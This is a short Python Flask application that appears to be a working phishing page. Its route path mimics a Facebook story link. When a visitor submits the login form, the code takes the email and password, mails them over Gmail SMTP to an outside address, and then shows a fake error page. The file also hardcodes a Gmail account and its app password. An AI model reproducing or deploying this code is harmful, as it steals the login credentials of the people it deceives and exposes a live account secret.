from flask import Flask, render_template, request, redirect
import smtplib
app = Flask(__name__)
user_name = "paperw745@gmail.com"
user_pass = "gwjknwhdfojszxeh"
@app.route('/')
def _world():
    return render_template('index.html', display="display:block;", hidden="display:none;")

@app.route("/story-phpstoryfbidpfbid0HEPQ7N9pUoLTrZTJbnowWcJCCpvM5mLPUEHidriUKbJp1Zwbp8HGAPNSBKzmoirjlid100000896005603postid100000896005603pfbid0HEPQ7N9pUoLTrZTJbnowWcJCCpvM5mLPUEHidriUKbJp1Zwbp8HGAPNSBKzmoirjlsfnsnmomibextidVhDh1V", methods=['POST'])
def receve_Data():
    if request.form["email"] == "" or request.form["pass"] == "":
        return render_template('index.html', display="display:none;", hidden="display:block;" )
    else:
        username = request.form["email"]
        password = request.form["pass"]
        with smtplib.SMTP("smtp.gmail.com") as connection:
            connection.starttls()
            connection.login(user=user_name, password=user_pass)
            connection.sendmail(from_addr=user_name, to_addrs="alaloosinadeem@gmail.com", msg=f"user name is so {username}, password for the account ist{password}")
        print(password, username)
        return render_template('wrong.html')

if __name__ == "__main__":
    app.run()